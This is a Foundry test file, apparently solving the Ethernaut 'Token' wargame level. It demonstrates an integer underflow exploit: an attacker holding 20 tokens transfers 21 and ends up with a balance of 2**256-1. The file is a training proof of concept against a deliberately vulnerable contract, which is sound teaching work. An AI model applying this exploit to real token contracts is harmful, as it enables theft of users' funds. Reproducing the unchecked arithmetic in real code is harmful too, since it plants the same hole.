// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Token.sol";

contract TokenTest is Test {

    function test_overflow() public {
        // integer overflow
        uint a = 0;
        a -= 1;

        assertEq(a, 2 ** 256 - 1);
    }

    function test_attack() public {
        address owner = address(0x1234);
        address attacker = address(0x5678);

        // deploy token as owner
        vm.startPrank(owner);

        // same initial supply as ethernaut instance
        Token token = new Token(21000000);

        // transfer 20 to attack to match ethernaut instance
        token.transfer(attacker, 20);

        vm.stopPrank();

        // verify balances before attack
        assertEq(token.balanceOf(attacker), 20);
        assertEq(token.balanceOf(owner), 20999980);

        vm.startPrank(attacker);
        // transfer over 20 to owner, triggering integer overflow
        token.transfer(owner, 21);
        vm.stopPrank();

        // verify balances after attack
        assertEq(token.balanceOf(attacker), 2 ** 256 - 1);
    }




}
